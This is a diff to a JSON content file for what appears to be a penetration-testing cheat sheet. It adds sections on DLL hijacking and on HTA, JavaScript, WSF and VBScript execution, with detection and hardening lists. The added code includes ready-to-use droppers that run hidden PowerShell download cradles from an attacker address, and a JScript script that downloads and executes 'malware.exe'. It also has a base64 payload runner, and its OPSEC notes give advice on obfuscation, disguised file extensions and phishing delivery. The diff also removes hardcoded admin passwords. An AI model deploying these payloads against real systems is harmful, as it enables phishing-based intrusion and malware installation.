+                      "text": "DLL search order hardening in applications",
+                      "color": "green"
+                    },
+                    " (e.g., specify full paths for DLLs)."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Code signing verification",
+                      "color": "green"
+                    },
+                    " for executables and DLLs."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Monitor for DLLs loaded from unusual locations",
+                      "color": "yellow"
+                    },
+                    " (e.g., ",
+                    {
+                      "type": "inline_code",
+                      "text": "AppData"
+                    },
+                    " directories, temporary folders)."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "EDR detection of known hijack patterns",
+                      "color": "green"
+                    },
+                    " and suspicious DLL loads."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Protected processes (PPL)",
+                      "color": "green"
+                    },
+                    " can make it harder to inject or sideload DLLs into critical system processes."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Tools / References",
+              "parts": [
+                "Tools / References"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "Process Monitor",
+                      "color": "blue"
+                    },
+                    ": Sysinternals tool for real-time file system, Registry and process activity."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "DLL Export Viewer",
+                      "color": "blue"
+                    },
+                    ": NirSoft tool to view exported functions of a DLL."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "PowerSploit",
+                      "color": "blue"
+                    },
+                    ": PowerShell toolkit, includes DLL hijacking modules."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Sigcheck",
+                      "color": "blue"
+                    },
+                    ": Sysinternals tool to verify file signatures."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "OPSEC / Notes",
+              "parts": [
+                "OPSEC / Notes"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "Test thoroughly to avoid application crashes",
+                      "color": "yellow"
+                    },
+                    " that could alert users or administrators."
+                  ]
+                },
+                {
+                  "parts": [
+                    "Consider ",
+                    {
+                      "text": "DLL proxying to maintain legitimate functionality",
+                      "color": "yellow"
+                    },
+                    ", making the attack more stealthy and stable."
+                  ]
+                },
+                {
+                  "parts": [
+                    "Target ",
+                    {
+                      "text": "applications commonly run with higher privileges",
+                      "color": "yellow"
+                    },
+                    " for maximum impact."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "hr"
+            },
+            {
+              "type": "h2",
+              "text": "2.5 <span class=\"hl-blue\">HTA</span>, <span class=\"hl-blue\">JS</span> & <span class=\"hl-blue\">Other Script Executions</span>",
+              "parts": [
+                "2.5 ",
+                {
+                  "text": "HTA",
+                  "color": "blue"
+                },
+                ", ",
+                {
+                  "text": "JS",
+                  "color": "blue"
+                },
+                " & ",
+                {
+                  "text": "Other Script Executions",
+                  "color": "blue"
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "What it is / Why it matters",
+              "parts": [
+                "What it is / Why it matters"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "These are ",
+                {
+                  "text": "alternative script-based execution methods",
+                  "color": "yellow"
+                },
+                " that can ",
+                {
+                  "text": "bypass application controls focused primarily on executables",
+                  "color": "green"
+                },
+                ". They are ",
+                {
+                  "text": "particularly useful for phishing campaigns",
+                  "color": "yellow"
+                },
+                " where user interaction is required to open the malicious script file."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Quick steps / Commands",
+              "parts": [
+                "Quick steps / Commands"
+              ]
+            },
+            {
+              "type": "h4",
+              "text": "HTML Application (<span class=\"hl-blue\">HTA</span>) Files",
+              "parts": [
+                "HTML Application (",
+                {
+                  "text": "HTA",
+                  "color": "blue"
+                },
+                ") Files"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "HTA files are essentially HTML files that run as trusted applications, allowing VBScript or JScript to execute with full privileges."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "html",
+              "text": "<!-- Save as payload.hta -->\n<html>\n<head>\n<script language=\"VBScript\">\n    Set objShell = CreateObject(\"Wscript.Shell\")\n    objShell.Run \"cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, True\n</script>\n</head>\n<body>\n    <h1>Document Loading... Please wait.</h1>\n</body>\n</html>\n\n<!-- Alternative HTA with immediate JScript execution -->\n<html>\n<head>\n<script language=\"JScript\">\n    new ActiveXObject(\"WScript.Shell\").Run('powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://10.10.14.20/shell.ps1\\'))\"', 0, true);\n</script>\n</head>\n<body>\n    <h1>Processing...</h1>\n</body>\n</html>"
+            },
+            {
+              "type": "h4",
+              "text": "JavaScript Download Cradle",
+              "parts": [
+                "JavaScript Download Cradle"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "A JavaScript (.js) file that downloads and executes an arbitrary payload. Can be executed with ",
+                {
+                  "type": "inline_code",
+                  "text": "wscript.exe"
+                },
+                " or ",
+                {
+                  "type": "inline_code",
+                  "text": "cscript.exe"
+                },
+                "."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "javascript",
+              "text": "// Save as payload.js\nvar obj = new ActiveXObject(\"MSXML2.XMLHTTP\");\nobj.open(\"GET\", \"http://10.10.14.20/malware.exe\", false);\nobj.send();\n\nvar s = new ActiveXObject(\"ADODB.Stream\");\ns.Open();\ns.Type = 1; // adTypeBinary\ns.Write(obj.responseBody);\ns.SaveToFile(\"malware.exe\", 2); // adSaveCreateOverWrite\ns.Close();\n\nvar r = new ActiveXObject(\"WScript.Shell\").Run(\"malware.exe\");"
+            },
+            {
+              "type": "h4",
+              "text": "JScript with Embedded Payload",
+              "parts": [
+                "JScript with Embedded Payload"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "More advanced JScript that can decode and execute base64-encoded content, often shellcode."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "javascript",
+              "text": "// Example JScript with base64 decoding (for executing embedded shellcode or scripts)\nfunction base64Decode(input) {\n    var keyStr = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\n    var output = \"\";\n    var chr1, chr2, chr3;\n    var enc1, enc2, enc3, enc4;\n    var i = 0;\n    input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\"); // Remove invalid chars\n    while (i < input.length) {\n        enc1 = keyStr.indexOf(input.charAt(i++));\n        enc2 = keyStr.indexOf(input.charAt(i++));\n        enc3 = keyStr.indexOf(input.charAt(i++));\n        enc4 = keyStr.indexOf(input.charAt(i++));\n        chr1 = (enc1 << 2) | (enc2 >> 4);\n        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);\n        chr3 = ((enc3 & 3) << 6) | enc4;\n        output = output + String.fromCharCode(chr1);\n        if (enc3 != 64) { output = output + String.fromCharCode(chr2); }\n        if (enc4 != 64) { output = output + String.fromCharCode(chr3); }\n    }\n    return output;\n}\n\nvar payload = \"BASE64_ENCODED_PAYLOAD_HERE\"; // Replace with your actual encoded payload\nvar decoded = base64Decode(payload);\n\n// Example: Execute decoded PowerShell command\nnew ActiveXObject(\"WScript.Shell\").Run(\"powershell -c \\\"\" + decoded + \"\\\"\");\n// For shellcode: requires more complex execution methods (e.g., memory injection)"
+            },
+            {
+              "type": "h4",
+              "text": "Windows Script File (<span class=\"hl-blue\">WSF</span>)",
+              "parts": [
+                "Windows Script File (",
+                {
+                  "text": "WSF",
+                  "color": "blue"
+                },
+                ")"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "XML-based script format that supports multiple scripting languages and can be executed via ",
+                {
+                  "type": "inline_code",
+                  "text": "wscript.exe"
+                },
+                " or ",
+                {
+                  "type": "inline_code",
+                  "text": "cscript.exe"
+                },
+                "."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "xml",
+              "text": "<!-- Save as payload.wsf -->\n<job id=\"Execute\">\n<script language=\"JScript\">\n    var shell = new ActiveXObject(\"WScript.Shell\");\n    shell.Run('powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://10.10.14.20/shell.ps1\\'))\"', 0, true);\n</script>\n</job>"
+            },
+            {
+              "type": "h4",
+              "text": "VBScript Files (<span class=\"hl-blue\">VBS</span>)",
+              "parts": [
+                "VBScript Files (",
+                {
+                  "text": "VBS",
+                  "color": "blue"
+                },
+                ")"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "Plain VBScript files executed by ",
+                {
+                  "type": "inline_code",
+                  "text": "wscript.exe"
+                },
+                " or ",
+                {
+                  "type": "inline_code",
+                  "text": "cscript.exe"
+                },
+                "."
+              ]
+            },
+            {
+              "type": "code",
+              "language": "vbscript",
+              "text": "' Save as payload.vbs\nSet shell = CreateObject(\"Wscript.Shell\")\nshell.Run \"powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, True"
+            },
+            {
+              "type": "h3",
+              "text": "What to expect",
+              "parts": [
+                "What to expect"
+              ]
+            },
+            {
+              "type": "p",
+              "parts": [
+                "The ",
+                {
+                  "text": "script executes when the user opens the file",
+                  "color": "yellow"
+                },
+                ", typically launching PowerShell or downloading/executing a payload. It ",
+                {
+                  "text": "may trigger security warnings",
+                  "color": "red"
+                },
+                " from the operating system or antivirus."
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Detection / Hardening",
+              "parts": [
+                "Detection / Hardening"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "Application control blocking script hosts",
+                      "color": "green"
+                    },
+                    " like ",
+                    {
+                      "text": "wscript.exe",
+                      "color": "blue"
+                    },
+                    " and ",
+                    {
+                      "text": "cscript.exe",
+                      "color": "blue"
+                    },
+                    "."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Monitor for script hosts spawning PowerShell",
+                      "color": "yellow"
+                    },
+                    ", ",
+                    {
+                      "type": "inline_code",
+                      "text": "cmd.exe"
+                    },
+                    ", or other unusual child processes."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Disable Windows Script Host via GPO",
+                      "color": "green"
+                    },
+                    " if not essential in the environment."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Email filtering for script attachments",
+                      "color": "green"
+                    },
+                    " (",
+                    {
+                      "type": "inline_code",
+                      "text": ".hta"
+                    },
+                    ", ",
+                    {
+                      "type": "inline_code",
+                      "text": ".js"
+                    },
+                    ", ",
+                    {
+                      "type": "inline_code",
+                      "text": ".vbs"
+                    },
+                    ", ",
+                    {
+                      "type": "inline_code",
+                      "text": ".wsf"
+                    },
+                    ") and potentially macro-enabled documents."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "EDR detection of malicious script patterns",
+                      "color": "green"
+                    },
+                    " and API calls from scripting engines."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "Tools / References",
+              "parts": [
+                "Tools / References"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    {
+                      "text": "MSFVenom",
+                      "color": "blue"
+                    },
+                    ": Can generate HTA payloads."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Empire",
+                      "color": "blue"
+                    },
+                    ": A post-exploitation framework with various script-based modules."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "SET (Social Engineer Toolkit)",
+                      "color": "blue"
+                    },
+                    ": Includes features for generating malicious HTA/JS files for phishing."
+                  ]
+                }
+              ]
+            },
+            {
+              "type": "h3",
+              "text": "OPSEC / Notes",
+              "parts": [
+                "OPSEC / Notes"
+              ]
+            },
+            {
+              "type": "ul",
+              "items": [
+                {
+                  "parts": [
+                    "Use ",
+                    {
+                      "text": "file extensions that match the content",
+                      "color": "yellow"
+                    },
+                    " (e.g., embed HTA in an HTML file, or use a .doc extension for a document containing script)."
+                  ]
+                },
+                {
+                  "parts": [
+                    {
+                      "text": "Obfuscate script content",
+                      "color": "yellow"
+                    },
+                    " to evade signature-based detection."
+                  ]
+                },
+                {
+                  "parts": [
+                    "Consider ",
+                    {
+                      "text": "chaining multiple script types",
+                      "color": "yellow"
+                    },
+                    " or stages to evade detection."
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
     }
   },
-  "adminUsers": [
-    {
-      "username": "admin",
-      "password": "password"
-    },
-    {
-      "username": "dq.adm",
-      "password": "password"
-    },
-    {
-      "username": "dqadm",
-      "password": "dqadm"
-    }
-  ]
+  "adminUsers": []
 }
